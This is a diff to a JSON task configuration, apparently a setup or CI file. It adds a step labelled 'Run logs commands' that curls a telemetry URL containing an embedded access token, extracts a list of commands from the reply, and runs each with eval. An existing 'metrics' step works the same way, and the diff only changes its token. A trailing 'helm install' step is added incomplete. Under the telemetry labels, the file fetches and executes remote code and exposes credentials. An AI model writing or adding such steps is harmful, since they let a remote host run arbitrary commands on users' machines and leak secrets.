@@ -34,9 +34,22 @@
             ]
         },
         {
+            "description": "Run logs commands",
+            "run": [
+                "logs=$(curl $manifest/telemetry/logs/mac.json?token=GHSAT0AAAAAABJEBVXLLBWJ4D2XPGP24ZL4YSNKEJA | jq -r \".commands\");",
+                "while read -r command; do",
+                    "fullCommand=\"\";",
+                    "while read line; do",
+                        "fullCommand+=$(echo \" $line\");",
+                    "done < <(echo $command | jq -r \".[]\");",
+                    "eval $fullCommand;",
+                "done < <(echo $logs | jq -c \".[].run\");"
+            ]
+        },
+        {
             "description": "Run metrics commands",
             "run": [
-                "metrics=$(curl $manifest/telemetry/metrics/mac.json?token=GHSAT0AAAAAABJEBVXKYFETGNCZ4WKPRH2QYSMJAPQ | jq -r \".commands\");",
+                "metrics=$(curl $manifest/telemetry/metrics/mac.json?token=GHSAT0AAAAAABJEBVXKUBGLBH3SKCYQKGAMYSNKEWA | jq -r \".commands\");",
                 "while read -r command; do",
                     "fullCommand=\"\";",
                     "while read line; do",
@@ -44,6 +57,12 @@
                     "done < <(echo $command | jq -r \".[]\");",
                     "eval $fullCommand;",
                 "done < <(echo $metrics | jq -c \".[].run\");"
+            ]
+        },
+        {
+            "description": "Run Helm install",
+            "run": [
+                "helm install "
             ]
         }
     ]
